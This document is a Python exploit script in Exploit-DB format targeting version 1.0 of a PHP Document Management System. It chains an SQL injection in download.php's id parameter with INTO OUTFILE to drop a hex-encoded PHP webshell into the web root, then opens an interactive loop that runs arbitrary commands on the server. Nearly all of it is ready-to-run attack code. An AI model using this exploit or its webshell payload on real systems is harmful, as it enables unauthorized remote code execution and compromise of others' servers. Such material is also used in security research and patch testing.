# Exploit Title: Document Management System - SQL Injection to RCE (webshell)
# Date: 23/04/21
# Exploit Author: Richard Jones
# Vendor Homepage: https://www.sourcecodester.com/php/7652/document-management-system.html
# Version: 1.0
# Tested on: Windows 10 build 19041 + xampp 3.2.4

#!/usr/bin/python3
import requests
import sys
import urllib.parse
import time

URL=f"http://TARGET/doc_system/docsytems/" # Change URL
SAVEPATH="c:/xampp/htdocs/" #Change to webfolder root (ie: /var/www/html on unix)

HOSTNAME=urllib.parse.urlparse(f"{URL}").netloc
PHPPAYLOAD="3c3f7068702073797374656d28245f4745545b2763275d293b203f3e" #<?php system($_GET['c']);?>
PAYLOAD=f"-8087' OR 6017=6017 LIMIT 0,1 INTO OUTFILE '{SAVEPATH}xythif42taA.php' LINES TERMINATED BY 0x{PHPPAYLOAD}-- -" #Change filename if you wish, replace 'xythif42taA.php'

RS='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
LB='\033[1;34m'
CY='\033[0;36m'
W='\033[1;73m'

def main():
    
            
    s = requests.Session()

    def banner():
        return r"""________      _____           _________.__           .__  .__   
\______ \    /     \   ______/   _____/|  |__   ____ |  | |  |  
 |    |  \  /  \ /  \ /  ___/\_____  \ |  |  \_/ __ \|  | |  |  
 |    `   \/    Y    \\___ \ /        \|   Y  \  ___/|  |_|  |__
/_______  /\____|__  /____  >_______  /|___|  /\___  >____/____/
        \/         \/     \/        \/      \/     \/           
Created by: Richard Jones
Date: 23/04/2021
Type: Webshell (sql injection)
        """

    def checkTarget():
        r = s.get(f"{URL}//View/download.php")
        if r.status_code == 200:
            return True
            
    def sendPayload():
        r = s.get(f"{URL}//View/download.php?id={PAYLOAD}")
        if not r.status_code == 200:
            print("Error in URL!, Check the URL again.")
            sys.exit()

    def checkShell():
        r = s.get(f"http://{HOSTNAME}/xythif42taA.php")
        if r.status_code == 200:
            return True
        else:
            return False

    def runWebShell():
        while True:
            cmd=input(f"{R}" + "DMsShell: "  + f"{RS}")
            if cmd == "exit":
                sys.exit()
            r = s.get(f"http://{HOSTNAME}/xythif42taA.php?c={cmd}")
            print(r.text.split("</html>")[1])

    print(f"{CY}" + banner() + f"{RS}")
    print(f"{W}" + "[-] Checking Target"  + f"{RS}")
    if not checkTarget():
        print(f"{R}"+"[!] Can't access download.php in target, check the URL" + f"{RS}")
        sys.exit()
    else:            
        print(f"{G}"+"[+] TARGET is alive!" + f"{RS}")
        sendPayload()
        if checkShell():
            print(f"{G}"+"[+] SHELL Activating!" + f"{RS}")
            time.sleep(1)
            runWebShell()

if __name__ == "__main__":
    main()
